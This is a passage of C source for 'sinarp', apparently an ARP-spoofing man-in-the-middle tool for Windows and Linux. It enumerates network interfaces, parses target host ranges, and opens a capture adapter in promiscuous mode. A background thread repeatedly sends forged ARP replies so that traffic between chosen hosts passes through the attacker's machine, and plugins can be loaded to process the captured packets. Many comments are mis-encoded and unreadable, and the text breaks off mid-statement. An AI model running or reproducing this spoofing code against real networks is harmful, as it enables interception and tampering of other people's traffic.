    /* set the description for the local loopback */
    //        if (dev->flags & PCAP_IF_LOOPBACK) 
    //        {
    //            SAFE_FREE(dev->description);
    //            dev->description = _strdup("Local Loopback");
    //        }

    /* fill the empty descriptions */
    //        if (dev->description == NULL)
    //            dev->description = dev->name;

    /* remove the pseudo device 'any' */
    //        if (!strcmp(dev->name, "any")) 
    //        {
    /* check if it is the first in the list */
    //           if (dev == g_devs)
    //               g_devs = ndev;
    //           else
    //               pdev->next = ndev;
    //           SAFE_FREE(dev->name);
    //           SAFE_FREE(dev->description);
    //           SAFE_FREE(dev);
    //           continue;
    //       }
    /* remember the previous device for the next loop */
    //       pdev = dev;
    //DBG_MSG("capture_getifs: [%s] %s\n", dev->name, dev->description);
    //   }
    return g_devs;
}

int sinarp_show_ifs(pcap_if_t *g_devs)
{
    uint32 idx = 0;
    pcap_if_t *dev;
    fprintf(stdout, "\nList of available Network Interfaces:\n\n");
    for (dev = (pcap_if_t *)g_devs; dev != NULL; dev = dev->next)
    {
        printf("%d. ",++idx);
        sinarp_ifprint(dev);
    }
    return idx;
}

/*
������������ŷ���������
*/
pcap_if_t *sinarp_get_if_by_id(pcap_if_t *g_devs,uint32 id)
{
    uint32 idx = 0;
    pcap_if_t *dev;
    /* we are before ui_init(), can use printf */
    fprintf(stdout, "List of available Network Interfaces:\n\n");
    for (dev = (pcap_if_t *)g_devs; dev != NULL; dev = dev->next)
    {
        if(++idx == id)
            return dev;
    }
    return NULL;
}

uint32   sinarp_hostname_to_ip(char * hostname)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( hostname ) ) == NULL)
    {
        return inet_addr(hostname);
    }

    addr_list = (struct in_addr **) he->h_addr_list;

    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        return (*addr_list[i]).s_addr;
        //return inet_ntoa(*addr_list[i]) ;
    }
    return 0;
}

/*
ֻ��ע ip  �����һλ  Ҳ���� dword ip�ĵ�һλ 
*/
int  sinarp_parse_host_string(const char *host_string,host_type type)
{
    const char *p = host_string;
    char *slash = NULL;
    char buff[256];
    char startIpStr[256]={0};
    uint32 start,end,range,submask,ip,idx;
    int bit;

    while((p = sinarp_take_out_string_by_char(p,buff,256,',')))
    {
        start = end = range = submask = 0;
        if((slash = strchr(buff,'/'))) //12.12.12.12/24
        {
            strncpy(startIpStr, buff, slash - buff );
            bit = atoi(slash+1);
            if(bit < 24)
            {
                return 0;
            }
            range = 0xFFFFFFFF >> bit;
            submask = 0xFFFFFFFF << (32 - bit);
            ip = sinarp_hostname_to_ip(startIpStr);
            if(!ip)
            {
                DBG_MSG("host %s not find \n",startIpStr);
                return 0;
            }
            start = (ip & ntohl(submask)) + ntohl(1);
            end = (ip & ntohl(submask)) + ntohl(range-1);

        }
        else if((slash = strchr(buff,'-')))  //12.12.12.12 - 12.12.12.122
        {
            strncpy(startIpStr, buff, slash - buff );
            start = sinarp_hostname_to_ip(startIpStr);
            end = sinarp_hostname_to_ip(slash+1);

        }else //12.12.12.12
        {
            start = sinarp_hostname_to_ip(buff);
            end = start;
        }
        if ((start || end) && (htonl(start) <= htonl(end)))
        {
            start >>= 24;
            end >>= 24;
            for (idx = start  ; idx <= end ; idx ++)
            {
                g_HostList[idx].type = type;
            }
        }
    }
    return 1;
}


/* From tcptraceroute, convert a numeric IP address to a string */
#define IPTOSBUFFERS    12
char *   sinarp_iptos(u_long in)
{
    static char output[IPTOSBUFFERS][3*4+3+1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
    snprintf(output[which], sizeof(output[which]),"%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

char* sinarp_ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
{
    socklen_t sockaddrlen;

#ifdef WIN32
    sockaddrlen = sizeof(struct sockaddr_in6);
#else
    sockaddrlen = sizeof(struct sockaddr_storage);
#endif

    if(getnameinfo(sockaddr, 
        sockaddrlen, 
        address, 
        addrlen, 
        NULL, 
        0, 
        NI_NUMERICHOST) != 0) address = NULL;

    return address;
}

/*
ͨ�����������ƣ����������õ���mac��ַ ʹ�� windows ��API
*/
BOOL sinarp_get_mac_from_if_name(const char *if_name,uint8 *mac)
{
#ifdef WIN32
    PIP_ADAPTER_INFO pInfo = NULL,pInfoTemp = NULL;
    ULONG ulSize = 0;
    int i;
    GetAdaptersInfo(pInfo,&ulSize); // First call get buff size
    pInfo = (PIP_ADAPTER_INFO)malloc(ulSize);
    GetAdaptersInfo(pInfo, &ulSize);
    pInfoTemp = pInfo;
    while(pInfo)
    {
        if (strcmp(pInfo->AdapterName,if_name)>=0)
        {
            for( i=0; i < (int)pInfo->AddressLength; i++)
                mac[i] = pInfo->Address[i];
            // Get Last Ip Address To szIPAddr
            //             PIP_ADDR_STRING pAddTemp=&(pInfo->IpAddressList);
            //             while(pAddTemp)
            //             {
            //                 strcpy(szIPAddr,pAddTemp->IpAddress.String);
            //                 pAddTemp=pAddTemp->Next;
            //             }
            //             if (strlen(pInfo->GatewayList.IpAddress.String) > 0)
            //                 strcpy(szGateIPAddr, pInfo->GatewayList.IpAddress.String);
            //             else
            //                 strcpy(szGateIPAddr, "N/A"); // Not Applicable
            free(pInfoTemp);
            return TRUE;
        }
        pInfo = pInfo->Next; 
    }
    free(pInfoTemp);
    return FALSE;
#else //Linux 
    int s;
    int ret;
    struct ifreq buffer;
    s = socket(PF_INET, SOCK_DGRAM, 0);
    memset(&buffer, 0x00, sizeof(buffer));
    strcpy(buffer.ifr_name, if_name);
    ret = ioctl(s, SIOCGIFHWADDR, &buffer);
    close(s);
    if(ret != -1)
    {
        memcpy(mac,buffer.ifr_hwaddr.sa_data,6);
        return TRUE;
    }
    sinarp_printf("%s\n","sinarp_get_mac_from_if_name():ioctl failed !!");
    return FALSE;
#endif
}

#ifndef WIN32
// linux route
#define BUFSIZE 8192

struct route_info
{
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};


int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
{
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do
    {
        /* Recieve response from the kernel */
        if((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0)
        {
            //perror("SOCK READ: ");
            return -1;
        }

        nlHdr = (struct nlmsghdr *)bufPtr;

        /* Check if the header is valid */
        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR))
        {
            //perror("Error in recieved packet");
            return -1;
        }

        /* Check if the its the last message */
        if(nlHdr->nlmsg_type == NLMSG_DONE)
        {
            break;
        }
        else
        {
            /* Else move the pointer to buffer appropriately */
            bufPtr += readLen;
            msgLen += readLen;
        }

        /* Check if its a multi part message */
        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0)
        {
            /* return if its not */
            break;
        }
    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));

    return msgLen;
}

/* parse the route info returned */
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)
{
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    char buff[32];

    rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);

    /* If the route is not for AF_INET or does not belong to main routing table then return. */
    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return;

    /* get the rtattr field */
    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);

    //printf("start,..................\n");
    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen))
    {
        switch(rtAttr->rta_type)
        {
        case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            //printf("if: %s \n",rtInfo->ifName);
            break;
        case RTA_GATEWAY:
            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
            inet_ntop(AF_INET, &rtInfo->gateWay, buff, 32);
            //printf("gw:%s \n",buff);
            break;
        case RTA_PREFSRC:
            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
            inet_ntop(AF_INET, &rtInfo->srcAddr, buff, 32);
            //printf("src:%s \n",buff);
            break;
        case RTA_DST:
            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
            inet_ntop(AF_INET, &rtInfo->dstAddr, buff, 32);
            //printf("dst:%s \n",buff);
            break;
        default:
            break;
        }
    }
    return;
}

#endif

/*
ͨ�� ip ������Ĭ�ϵ����ص�ַ
Ҳ��ʹ��windows��API  ��֪�������ֲ�� Linux Ҫ��ô����
*/
BOOL sinarp_get_gw_from_ip(uint32 ip,uint32 *gw)
{
#ifdef WIN32
    PIP_ADAPTER_INFO pInfo = NULL;
    PIP_ADAPTER_INFO pInfoTemp = NULL;
    ULONG ulSize = 0;
    PIP_ADDR_STRING pAddTemp;
    GetAdaptersInfo(pInfo,&ulSize); // First call get buff size
    pInfo = (PIP_ADAPTER_INFO) malloc(ulSize);
    GetAdaptersInfo(pInfo, &ulSize);
    pInfoTemp = pInfo;
    *gw = 0;
    while(pInfo)
    {
        // Get Last Ip Address To szIPAddr
        pAddTemp=&(pInfo->IpAddressList);
        while(pAddTemp)
        {
            if(inet_addr(pAddTemp->IpAddress.String) == ip)
            {
                *gw = inet_addr(pInfo->GatewayList.IpAddress.String);
                free(pInfoTemp);
                return TRUE;
            }
            pAddTemp=pAddTemp->Next;
        }
        pInfo = pInfo->Next; 
    }
    free(pInfoTemp);
    return FALSE;
#else  //linux
    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;
    char msgBuf[BUFSIZE]; // pretty large buffer

    int sock, len, msgSeq = 0;

    *gw = 0;

    /* Create Socket */
    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)
    {
        perror("Socket Creation: ");
        return(-1);
    }

    /* Initialize the buffer */
    memset(msgBuf, 0, BUFSIZE);

    /* point the header and the msg structure pointers into the buffer */
    nlMsg = (struct nlmsghdr *)msgBuf;
    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);

    /* Fill in the nlmsg header*/
    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.
    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .

    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.
    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.
    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.

    /* Send the request */
    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0)
    {
        fprintf(stderr, "Write To Socket Failed...\n");
        return -1;
    }

    /* Read the response */
    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0)
    {
        fprintf(stderr, "Read From Socket Failed...\n");
        return -1;
    }

    /* Parse and print the response */
    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));

    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len))
    {
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);

        // Check if default gateway
        if (rtInfo->dstAddr.s_addr == 0)
        {
            if((rtInfo->gateWay.s_addr & 0x00FFFFFF) == (ip & 0x00FFFFFF))
            {
                //��һ�������� ����Ϊ�Ƕ�Ӧ�����ص�ַ 
                *gw = rtInfo->gateWay.s_addr;
                break;
            }
            // copy it over
            //inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
            //break;
        }
    }

    free(rtInfo);
    close(sock);
    if(*gw)
        return TRUE;
    return FALSE;
#endif
}

/* Print all the available information on the given interface */
void sinarp_ifprint(pcap_if_t *d)
{
    pcap_addr_t *a;

    char ip6str[128];
    // struct sockaddr_dl *link;

    /* Name */
    printf("%s\n",d->name);

    /* Description */
    if (d->description)
        printf("\tDescription: %s\n",d->description);

    /* Loopback Address*/
    printf("\tLoopback: %s\n",(d->flags & PCAP_IF_LOOPBACK)?"yes":"no");

    /* IP addresses */
    for(a=d->addresses;a;a=a->next) 
    {
        printf("\tAddress Family: #%d\n",a->addr->sa_family);

        switch(a->addr->sa_family)
        {
        case AF_INET:
            printf("\tAddress Family Name: AF_INET\n");
            if (a->addr)
                printf("\tAddress: %s\n",sinarp_iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
            if (a->netmask)
                printf("\tNetmask: %s\n",sinarp_iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
            if (a->broadaddr)
                printf("\tBroadcast Address: %s\n",sinarp_iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
            if (a->dstaddr)
                printf("\tDestination Address: %s\n",sinarp_iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
            break;

        case AF_INET6:
            printf("\tAddress Family Name: AF_INET6\n");
            if (a->addr)
                printf("\tAddress: %s\n", sinarp_ip6tos(a->addr, ip6str, sizeof(ip6str)));
            break;
            // ò���� windows �ϲ���ʹ�� winpcap ����� ������ MAC ��ַ �����ǵ�ʹ��windows��API���㡣��

            // case AF_LINK:
            //      if(a->addr->sa_data != NULL)
            //       {
            // MAC ADDRESS
            //struct sockaddr_dl *sdl = (struct sockaddr_dl *) a->addr->sa_data;
            //link = (struct sockaddr_dl*)a->addr->sa_data;
            //if(link->sdl_alen)
            // char mac[link->sdl_alen];
            // caddr_t macaddr = LLADDR(link);
            //memcpy(mac, LLADDR(link), link->sdl_alen);

            //  if(link->sdl_alen == 6){
            // Seen in some sample code
            //         printf("%02x:%02x:%02x:%02x:%02x:%02x",
            //               (unsigned char)a->addr->sa_data[0],
            //               (unsigned char)a->addr->sa_data[1],
            //               (unsigned char)a->addr->sa_data[2],
            //               (unsigned char)a->addr->sa_data[3],
            //               (unsigned char)a->addr->sa_data[4],
            //              (unsigned char)a->addr->sa_data[5]);
            //}
            // else if(link->sdl_alen > 6) 
            //  {
            // This is what happens in OSX 10.6.5
            //     sprintf(ret, "%02x:%02x:%02x:%02x:%02x:%02x",
            //         (unsigned char)mac[1],
            //          (unsigned char)mac[2],
            //         (unsigned char)mac[3],
            //        (unsigned char)mac[4],
            //         (unsigned char)mac[5],
            //         (unsigned char)mac[6]);
            // }
            // }
        default:
            printf("\tAddress Family Name: Unknown\n");
            break;
        }
    }
    printf("\n");
}

/*
������ƭ���ݰ����߳�
*/
#ifdef WIN32
DWORD __stdcall sinarp_spoof_thread(void *lparam)
#else
void * sinarp_spoof_thread(void *lparam)
#endif
{
    int i,j;
    g_is_spoof_thread_active = 1;
    do
    {
        switch(g_spoof_type)
        {
        case SPOOF_A:  
            {
                //  A ---> M ---> B
                //��  A���е��������͡�ARP�����ߡ��ҡ��ǡ�B��Ҳ���� B �� ip ��Ӧ�ҵ� MAC ��ַ
                for (i = 0;i < 0xFF ;i++)
                {
                    if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                    {
                        for (j = 0 ;j < 0xFF;j++)
                        {
                            if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                            {
                                sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_my_mac);
                            }
                        }
                    }
                }
            }
            break;
        case SPOOF_AB:
            {
                // A��<---> M <---> B
                //���ߡ�A ���� B
                for (i = 0;i < 0xFF ;i++)
                {
                    if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                    {
                        for (j = 0 ;j < 0xFF;j++)
                        {
                            if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                            {
                                sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_my_mac);
                            }
                        }
                    }
                }
                //���� B�����ǡ�A
                for (i = 0;i < 0xFF ;i++)
                {
                    if(g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
                    {
                        for (j = 0 ;j < 0xFF;j++)
                        {
                            if(g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
                            {
                                sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_my_mac);
                            }
                        }
                    }
                }
            }
            break;
        default:
            break;
        }
#ifdef WIN32
        Sleep(g_interval);
#else //Linux 
        Sleep(g_interval);
#endif
    }while(g_is_time_shutdown == 0);
    g_is_spoof_thread_active = 0;
    return 0;
}

#ifdef WIN32
DWORD _stdcall sinarp_capture_thread(void *lparam)
{
    g_is_capture_thread_active = 1;
    sinarp_do_capture();
    g_is_capture_thread_active = 0;
    return 0;
}
#else
void *  sinarp_capture_thread(void *lparam)
{
    g_is_capture_thread_active = 1;
    sinarp_do_capture();
    g_is_capture_thread_active = 0;
    return 0;
}
#endif

#ifdef WIN32
void sinarp_create_thread(DWORD  (__stdcall *func)(void *),void *lparam)
{
    CreateThread(NULL,0,func,lparam,0,NULL);
}
#else //for Linux 
void sinarp_create_thread(void* ( *func)(void *),void *lparam)
{
    //CreateThread(NULL,0,func,lparam,0,NULL);
    pthread_t thread_id;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
    pthread_create(&thread_id,&attr,func,lparam);
    pthread_attr_destroy(&attr);
}
#endif

#ifdef WIN32

int ctrlc = 0;

BOOL WINAPI HandlerRoutine(DWORD fdwCtrlType)
{ 
    switch (fdwCtrlType) 
    { 
        // Handle the CTRL-C signal. 
    case CTRL_C_EVENT: 
    case CTRL_CLOSE_EVENT: 
    case CTRL_BREAK_EVENT:  
    case CTRL_LOGOFF_EVENT: 
    case CTRL_SHUTDOWN_EVENT:
        ctrlc++;
        if(ctrlc == 2)
            return FALSE;
        if(ctrlc == 3)
            exit(88);
        printf("\r\nCtrl+C Is Pressed.\r\n"); // ǰ��� \n �Ǳ���������� ~~
        Sleep(200);
        g_is_time_shutdown = 1; //֪ͨ�߳��˳���������
        pf_pcap_breakloop(g_adhandle);
        return TRUE; //���������˳� 		
    default: 
        return FALSE; 
    }
}
#else
void  cleanup(int s)
{
    printf("\r\nCtrl+C Is Pressed.\r\n"); // ǰ��� \n �Ǳ���������� ~~
    Sleep(200);
    g_is_time_shutdown = 1; //֪ͨ�߳��˳���������
    pf_pcap_breakloop(g_adhandle);
    Sleep(2500);
}
#endif

void sinarp_restore_arp_table()
{
    //�������б�����ȡ����ȷ�� ip ��Ӧ�� mac
    int i,j;
    switch(g_spoof_type)
    {
    case SPOOF_A:
        {
            for (i = 0;i < 0xFF ;i++)
            {
                if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                {
                    for (j = 0 ;j < 0xFF;j++)
                    {
                        if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                        {
                            sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_HostList[j].mac);
                        }
                    }
                }
            }
        }
        break;
    case SPOOF_AB:
        {
            for (i = 0;i < 0xFF ;i++)
            {
                if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                {
                    for (j = 0 ;j < 0xFF;j++)
                    {
                        if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                        {
                            sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_HostList[j].mac);
                        }
                    }
                }
            }
            //���� B�����ǡ�A
            for (i = 0;i < 0xFF ;i++)
            {
                if(g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
                {
                    for (j = 0 ;j < 0xFF;j++)
                    {
                        if(g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
                        {
                            sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_HostList[j].mac);
                        }
                    }
                }
            }
        }
        break;
    default:
        break;
    }
}

void sinarp_parse_plugin_string(const char *plugin_string)
{
    char buff[256];
    const char *p = plugin_string;
    while((p = sinarp_take_out_string_by_char(p,buff,256,',')))
    {
        if(FALSE == sinarp_load_plugin(buff))
        {
            sinarp_printf("Failed to load plugin %s !\n",buff);
        }
    }
}


/*=======================================
from NetFuke src 
Name:	b_FindStringByFlag
Usage:	ȡ�ñ���м���ַ���
����1:	�ַ���ָ��
����1:	��־1
����1:	��־2
����1:	���������
����2:	�����������С
����ֵ:	�Ƿ���ֵ
========================================*/
BOOL sinarp_find_string_by_flag(
    const char*		p_szContent,
    const char*		p_szFlag1,
    const char*		p_szFlag2,
    char*			p_szValue,
    const uint32	i4_ValuseSize
    )
{
    char	szContent[65535];
    char*	p_szFlag1Index	= NULL;
    char*	p_szFlag2Index	= NULL;

    // ��Ч�Լ��
    if( ( p_szContent == NULL ) || ( p_szValue == NULL ) )
    {
        return FALSE;
    }

    // �����ַ���
    strcpy( szContent, p_szContent );

    // �ҵ���һ��Flag
    p_szFlag1Index = strstr( szContent, p_szFlag1 );

    if( p_szFlag1Index )
    {
        // �ҵ��ڶ���Flag
        p_szFlag1Index += strlen( p_szFlag1 );
        p_szFlag2Index = strstr( p_szFlag1Index, p_szFlag2 );

        if( p_szFlag2Index )
        {
            *p_szFlag2Index = '\0';

            // ���ȼ��
            if( strlen( p_szFlag1Index ) >= i4_ValuseSize )
            {
                strncpy( p_szValue , p_szFlag1Index, i4_ValuseSize - 1 );
            }
            else
            {
                strcpy( p_szValue , p_szFlag1Index );
            }
            return TRUE;
        }
    }
    return FALSE;
}

#ifndef WIN32
int setsignal(int sig, void (* func)(int))
{
    struct sigaction old, new;

    memset(&new, 0, sizeof(new));
    new.sa_handler = func;
    if (sigaction(sig, &new, &old) < 0)
        return (int)(SIG_ERR);
    return (int)(old.sa_handler);
}
#endif
/*
sinarp -i 0 -A 12,3,4,22,31,54 -B 123,11,234
*/

int  main(int argc ,char ** argv)
{
    uint32 idx = 0;
    uint32 host_count = 0;
    uint32 active_count_A,active_count_B;
    uint32 M_ip = 0;
    pcap_addr_t *a;
    uint32 i;
    struct bpf_program fcode;
    pcap_if_t *pdevs,*open_devs;
    char errbuf[PCAP_ERRBUF_SIZE];
    char sniffer_filter[256];
	char *plugin_string = NULL;//�ȱ��� ����ַ��� ��һЩȫ�ֱ�������ʼ������ �ټ��ز��
//	char cwd[4096];
	pdevs = open_devs = NULL;
#ifndef WIN32
    setvbuf(stdout, NULL, _IOLBF, 0);
#endif
// 	getcwd(cwd,4096);
// 	printf("%s\n",cwd);
// 	if(-1 == setenv("LD_LIBRARY_PATH",cwd,1))
// 	{
// 		perror("setenv():");
// 	}
// 	printf("%s\n",getenv("LD_LIBRARY_PATH"));  //ʵ��֤����������ʱû���õġ���


    sinarp_copyright_msg(); //��Ȩ��Ϣ
    if(!sinarp_init_pcap_funcs())
    {
        printf("init winpcap failed !\n");
        return -1;
    }
    if(argc < 2)
    {
        sinarp_show_help_msg();
        pdevs = sinarp_get_ifs();
        if(pdevs == NULL)
        {
            printf("Failed to get the adapter information~~\n");
            return -1;
        }
        sinarp_show_ifs(pdevs);
        pf_pcap_freealldevs(pdevs);
        return 0;
    }

    for (idx = 2 ;idx <= argc ;idx ++)
    {
        if(stricmp(argv[idx-1],"-A")==0)
        {
            sinarp_parse_host_string(argv[idx],HOST_A);
        }else if (stricmp(argv[idx-1],"-M")==0)
        {
            //�����м��˵�ip ��ȷ�� ip ��ǰ3λ  netmask ����Ϊ 255.255.255.0
            M_ip = sinarp_hostname_to_ip(argv[idx]);
            if(M_ip == 0)
            {
                printf("unknown M host : %s\n",argv[idx]);
                goto clean;
            }
        }else if(stricmp(argv[idx-1],"-B")==0)
        {
            sinarp_parse_host_string(argv[idx],HOST_B);
        }else if(stricmp(argv[idx-1],"-i")==0)
        {
            pdevs = sinarp_get_ifs();
            open_devs = sinarp_get_if_by_id(pdevs,(uint32)atoi(argv[idx]));
            if(!open_devs)
            {
                printf("pleaser input a right id !\n");
                goto clean;
            }
            printf("use Interfaces : %s\n",open_devs->name);
            if((g_adhandle = pf_pcap_open_live(open_devs->name, // device 
                65536,     // portion of the packet to capture.
                // 65536 grants that the whole packet will be captured on all the MACs.
                1,       // promiscuous mode 
                1, //a value of 0 means no time out
                errbuf     // error buffer
                )) == NULL)
            {
                sinarp_printf("\r\nUnable to open the adapter. \
                              %s is not supported by WinPcap\r\n", open_devs->description);
                goto clean;
            }

			strncpy(g_opened_if_name,open_devs->name,255);
            //һ������������ܰ󶨶��IP�� ������ÿ��ֻ��ʹ�����е�һ��

        }else if(stricmp(argv[idx-1],"-s")==0)
        {
            switch(atoi(argv[idx]))
            {
            case SPOOF_A:
                g_spoof_type = SPOOF_A;
                break;
            case SPOOF_AB:
                g_spoof_type = SPOOF_AB;
                break;
            default:
                sinarp_printf("unknown spoof type !\n");
                goto clean;
            }
        }else if(stricmp(argv[idx-1],"-p")==0)
        {
			plugin_string = argv[idx];
            //sinarp_parse_plugin_string(argv[idx]);
        }else if(stricmp(argv[idx-1],"-t")==0)
        {
            g_interval = atoi(argv[idx]); 
            if(g_interval == 0)
            {
                sinarp_printf("not a right interval ~~~\n");
                goto clean;
            }
            //	if(g_interval < 200)  //ȥ������ һЩ����ǽ̫ ������ �Ҳ��ܷ������ı�����
            //	{
            //		printf("interval time  too short !\n");
            //		goto clean;
            //	}
        }else if(stricmp(argv[idx-1],"-f")==0)
        {
            //�ҵ��Ļ� ��ô�͹ر� ip ת������ 
            g_auto_ip_forward = 0;
        }
    }
    //
    if(!open_devs)
    {
        //�û�û��ָ������
        printf("please input the adapter id��\n");
        //printf("��ָ��Ҫ�򿪵�������\n");
        goto clean;
    }

    //check M 
    if(M_ip)
    {
        //�����м��˵� ip �ǲ�����������ip�б�����
        /* IP addresses */
        for(a=open_devs->addresses;a;a=a->next) 
        {
            switch(a->addr->sa_family)
            {
            case AF_INET:
                if (a->addr)
                    if(M_ip == ((struct sockaddr_in *)a->addr)->sin_addr.s_addr)
                    {
                        g_my_ip = M_ip;
                        if(a->broadaddr)
                            g_my_boardcast_addr = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
                        if(a->netmask)
                            g_my_netmask = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;
                        sinarp_get_gw_from_ip(g_my_ip,&g_my_gw_addr);
#ifdef WIN32
                        //printf("I am run in windows \n");
                        sinarp_get_mac_from_if_name(strchr(open_devs->name,'{'),g_my_mac);
#else
                        //printf(" I am run in linux \n");
                        sinarp_get_mac_from_if_name(open_devs->name,g_my_mac);
#endif
                    }
                    break;
            case AF_INET6: //��֧�� ipv6
                break;
            default:
                break;
            }
            if(g_my_ip)
                break;
        }
        if(!g_my_ip)
        {
            //ip ��ַ���������б�����
            printf("the M ip : %s invaild!\n",inet_ntoa(*(struct in_addr *)&M_ip));
            goto clean;
        }
    }
    else
    {
        //�û�û��ָ���м���IP ��ôȡ�����ĵ�һ��IP
        for(a=open_devs->addresses;a;a=a->next) 
        {
            switch(a->addr->sa_family)
            {
            case AF_INET:
                if (a->addr)
                    g_my_ip = ((struct sockaddr_in *)a->addr)->sin_addr.s_addr;
                if(a->broadaddr)
                    g_my_boardcast_addr = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
                if(a->netmask)
                    g_my_netmask = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;
                sinarp_get_gw_from_ip(g_my_ip,&g_my_gw_addr);
#ifdef WIN32
                sinarp_get_mac_from_if_name(strchr(open_devs->name,'{'),g_my_mac);
#else
                sinarp_get_mac_from_if_name(open_devs->name,g_my_mac);
#endif
                break;
            case AF_INET6: //��֧�� ipv6
                break;
            default:
                break;
            }
            if(g_my_ip)
                break;
        }
        if(!g_my_ip) //��������û��һ�����õ� ip
        {
            printf("can not find a ip bind on this NIC\n");
            //printf("���������Ҳ���һ�����õ�ip\n");
            goto clean;
        }
    }
    //�����м��˵�ip ��ȷ�� ip ��ǰ3λ  netmask ����Ϊ 255.255.255.0
    M_ip = g_my_ip;
    M_ip &= 0x00FFFFFF;
    //DBG_MSG("M:%s\n",sinarp_iptos(M_ip));
    // init the host list
    for (i = 0;i <= 0xFF;i++)
    {
        g_HostList[i].ip |= M_ip;
        g_HostList[i].ip |= i<<24;
    }
    //ò���Ѿ�����Ҫʹ�õ� ������Ϣ�� 
    pf_pcap_freealldevs(pdevs);
    pdevs = NULL;
    //check A
    //printf("A Host list:\n");
    for (idx  = 0 ;idx <= 0xFF;idx ++)
    {
        if(g_HostList[idx].type == HOST_A)
        {
            //printf("\t%s\n",sinarp_iptos(g_HostList[idx].ip));
            ++host_count;
        }
    }
    if(host_count < 1)
    {
        //�û�û��ָ��A��������ôʹ��Ĭ�ϵ�����
        if(g_my_gw_addr == 0)
        {
            //���ص�ַû����ȷ�Ļ�ȡ
            printf("Failed to get the gw ip !\n");
            goto clean;
        }
        g_HostList[g_my_gw_addr >> 24].type = HOST_A;
        //printf("\t%s\n",sinarp_iptos(g_HostList[g_my_gw_addr >> 24].ip));
    }
    //check B
    //printf("B Host list:\n");
    host_count = 0;
    for (idx  = 0 ;idx <= 0xFF;idx ++)
    {
        if(g_HostList[idx].type == HOST_B)
        {
            //printf("\t%s\n",sinarp_iptos(g_HostList[idx].ip));
            ++host_count;
        }
    }
    if(host_count < 1)
    {
        printf("you must special at least one B host !\n");
        goto clean;
    }
    //�� �Լ��� ip  �������б�� A B �г�ȥ
    g_HostList[g_my_ip >> 24].type =  HOST_UNKNOWN;
    //����һ�� pcap �� filter �������ǲ������Լ�����ȥ�İ�
    sprintf(sniffer_filter,"ether src not  %02x:%02x:%02x:%02x:%02x:%02x",
        g_my_mac[0],
